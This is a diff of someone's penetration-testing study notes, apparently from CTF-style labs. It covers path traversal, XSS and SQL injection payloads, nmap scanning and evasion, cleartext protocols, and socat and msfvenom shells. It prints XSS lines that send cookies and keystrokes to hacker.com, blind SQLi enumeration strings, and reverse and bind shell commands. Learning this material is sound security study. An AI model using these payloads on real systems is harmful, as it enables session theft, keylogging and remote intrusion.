@@ -116,7 +116,8 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 
 - Path Traversal:
   
-		$ http://webapp.thm/get.php?file=../../../../boot.ini 
+		$ http://webapp.thm/get.php?file=../../../../boot.ini
+  
 		$ http://webapp.thm/get.php?file=../../../../windows/win.ini
 
 - Common OS files location:
@@ -143,12 +144,18 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 # XSS PAYLOADS:
 
 	$ <script>alert('hello');</script> (POC)
+	
 	$ <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script> (session stealing)
+	
 	$ <script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
 	(keylogger)
+	
 	$ "><script>alert('sup');</script> (escaping input tag)
+	
 	$ </textarea><script>alert('yoh');</script> (escaping textarea)
+	
 	$ <sscriptcript>alert('THM');</sscriptcript> (bypassing filters)
+	
 	$ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('hi!')//>\x3e (XSS polyglots 	all in one type sh)
 
 # SQLi Payloads:
@@ -160,20 +167,29 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - Boolean Based Blind SQLi:
   
 		$ select * from users where username = '%username%' LIMIT 1;
+  
 		$ username UNION SELECT 1;-- (saerching number of columns in the user's table)
+  
 		$ username UNION SELECT 1,2,3;-- (finding the path to the actual column)
+  
 		$ username UNION SELECT 1,2,3 where database() like '%';-- (enumeration of the database)
 			--cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string matches the first letter of the database name. 					After finding the first letter do it until we find the database full name.
+  
 		$ username UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'something' and table_name like 'a%';--  (enumeration of table name)
 			-- using infromation_schema database to find the table name just like we found the databse name using "like" operator.
+  
 		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%'; (enumerating column 		name)
+  
 		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%' and COLUMN_NAME !			='id'; (preventing the discovery of the same column twice)
+  
 		$ username UNION SELECT 1,2,3 from users where username like 'a% (enumeration of username)
+  
 		$ username UNION SELECT 1,2,3 from users where username='something' and password like 'a% (enumerating password)
 
 - Time Based Blind SQLi:
   
 		$ username UNION SELECT SLEEP(5);-- (if there is pause to the response, it worked otherwise it failed)
+  
 		$ username UNION SELECT SLEEP(5),2;-- (adding another column until the response time is 5 seconds)
 
 # Burp Suite:
@@ -193,13 +209,21 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 # Nmap Live Host Discovery:
 
 	$ nmap -sn TARGETS
+	
 	$ nmap -PR -sn TARGET/24 (ARP scan on the same subnet)
+	
 	$ nmap -PE -sn MACHINE_IP/24 (ICMP echo)
+	
 	$ nmap -PP -sn MACHINE_IP/24 (ICMP Timestamp)
+	
 	$ nmap -PM -sn MACHINE_IP/24 (ICMP Address Mask)
+	
 	$ nmap -PS -sn MACHINE_IP/24 (TCP SYNchronize)
+	
 	$ sudo nmap -PA -sn MACHINE_IP/24 (TCP ACKnowledge)
+	
 	$ sudo nmap -PU -sn 10.10.68.220/24 (UDP)
+	
 	$ --dns-servers DNS_SERVER (Reverse-DNS Lookup)
 
 # Nmap Port Scanning:
@@ -207,15 +231,24 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - TCP flags:
   
     	-- TCP header = 24 bytes of a TCP segment
-    	-- First row (Source port number and Destination Port number) each allocating 16 bits (2 bytes) 
+  
+    	-- First row (Source port number and Destination Port number) each allocating 16 bits (2 bytes)
+  
     	-- Second row Sequence number and third row Acknowledgement Number
+  
     	-- Total six rows. Each row contains 32 bit (4 bytes) so total 6 rows equals to 24 bytes
+  
     	-- TCP Header Flags:
         		-> URG : urgent flag first priority to be processed
+  
         		-> ACK: acknowledge the receipt of a TCP segment
+  
         		-> PSH: push flag asking TCP to pass the data to the applicatioh
+  
         		-> RST: Reset flag used to reset the connection
+  
         		-> SYN: Synchronize flag used to initiate a TCP 3-way handshake and synchronize sequence numbers
+  
         		-> FIN: Finish flag meaning the sender has no more data to send
         
 - TCP Connect Scan:
@@ -230,7 +263,9 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
   
     	-- -sN (null), -sF (fin), -sX (Xmas)
         		->Similarites: if port open RST packet is received otherwise reported as open|filtered
+  
     	-- -sM (Maimon scan)
+  
     	-- -sA (ACK scan)
 
 - UDP Scan:
@@ -244,14 +279,18 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - Spoofing and Decoys:
   
 		$ nmap -S SPOOFED_IP MACHINE_IP (spoofed ip)
+  
 		$ nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP (Decoy)
     			-- 3rd and 4th is randomly generated while fifth is the attacker.
+  
         	-> Advantages:  make the scan look like coming from multiple IPs so the attacker's IP would be lost.
 
 - Fragmented Packets:
   
 		$ sudo nmap -sS -p80 -f MACHINE_IP
+  
     		-> The 24 bytes of TCP header will be divided into multiple bytes of 8.
+  
     		-> So, adding another -ff will fragment the data into multiples of 16, first will get 16 bytes and thhe remaing will get the 8 bytes of the TCP header.
     
 - Service Detection:
@@ -261,6 +300,7 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - OS Detection and Traceroute:
   
 		$ sudo nmap -sS -O MACHINE_IP (OS details)
+  
 		$ sudo nmap -sS --traceroute MACHINE_IP (finding routers between attacker and the target)
 
 # Protocols and Servers:
@@ -272,40 +312,60 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
  - HTTP (HyperText Transfer Protocol) default port - 80, transfers web pages like HTML pages and images.
  
 		$ telnet MACHINE_IP 80
+
 		$ host:telnet
+
 		$ GET /index.html HTTP/1.1
 
 - FTP (File Transfer Protocol) default port - 21
   
 		$ ftp MACHINE_IP
+  
 		$ Name: ****
+  
 		$ Password: ****
+  
 		ftp> ls
-		ftp> ascii 
+  
+		ftp> ascii
+  
 		ftp> get something.txt
+  
 		ftp> exit
 
 - SMTP (Simple Mail Transfer Protocol) default port - 25
   
     -- Components: Mail Submission Agent(MSA), Maile Transfer Agent(MTA), Mail Delivery Agent(MDA) and Mail User Agent (MUA)
+  
     -- MUA -> MSA -> MTA -> MDA -> MUA
   
 		$ telnet MACHINE_IP 25
+  
 		$ helo telnet
+  
 		$ mail from: <address>
+  
 		$ rctp to: <addres>
+  
 		data: something
+  
 		$ quit
 
 
 - POP3 (Post Office Protocol 3): used to download the email from MDA server. default port - 110
   
 		$ telnet MACHINE_IP 110
+  
 		$ USER ****
+  
 		$ PASS ****
+  
 		$ STAT
+  
 		$ LIST
+  
 		$ RETR 1 (retrive the first message on the list)
+  
 		$ QUIT
   
 		-> Disadvantage: mailboxes are not synchronized like read and unread messages.
@@ -313,9 +373,13 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - IMAP (Internet Message Access Protocol): keeps email synchronized across multiple devices. default port - 143
   
 		$ telnet MACHINE_IP 143
+  
 		$ c1 LOGIN username password
+  
 		$ c2 LIST "" "*"
+  
 		$ c3 EXAMINE BOX
+  
 		$ c4 LOGOUT
 
 ** All of these protocols uses cleartext so anyone watching the network traffic would know the user's credential.
@@ -327,7 +391,9 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - Using tcpdump:
   
 		$ sudo tcpdump port 110 -A (requires access to the network traffic)
+  
     	-> here POP3 packets are being captured. -A means we want it in ASCII format
+  
   		- Solution: Adding an encryption layer on top of any network protocol. Particularly, Transport Layer Security (TLS).
     
 # Man-in-the-middle (MITM) attack:
@@ -362,12 +428,15 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - Authenticate using username and password.
   
 		$ ssh nischal@MACHINE_IP
+  
 		$ nischal@MACHINE_IP's password: helloworld
   
 - Secure Copuy protocol can also be used to copy files from the server.
   
 		$ scp document.txt nischal@MACHINE_IP:/home/nischal
-		$ nischal@MACHINE_IP's password: 
+  
+		$ nischal@MACHINE_IP's password:
+  
 		$ document.txt
 
 # Password Attack:
@@ -407,12 +476,15 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - Bind Shell
   
 		$ socat TCP-L:<PORT> EXEC:"bash -li" (Target=Linux)
+  
 		$ socat TCP-L:<PORT> EXEC:powershell.exe,pipes (Target=Windows)
+  
 		$ socat TCP:<TARGET-IP>:<TARGET-PORT> - (on the attacking machine applicable for both targets)
 
 - Linux Target only:
   
 		$ socat TCP-L:<port> FILE:`tty`,raw,echo=0 (attacker)
+  
 		$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane (target)
 
 # SOCAT encrypted Shells:
@@ -424,11 +496,13 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - Reverse Shell:
   
 		$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - (attacker)
+  
 		$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash (target)
 	
 - Bind Shell:
   
 		$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes (target)
+  
 		$ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - (attacker)
 	
 #FOR LINUX:
@@ -448,10 +522,14 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 # MSFVENOM:
 
 	$ msfvenom -p <PAYLOAD> <OPTIONS>
+	
 	$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
 	        {<OS>/<arch>/<payload>}
+			
 	$ shell_reverse_tcp (stageless payload)
+	
 	$ shell/reverse_tcp (staged payload)
+	
 	$ metasploit multi/handler (used for staged payload)
 
 #WEBSHELLS:
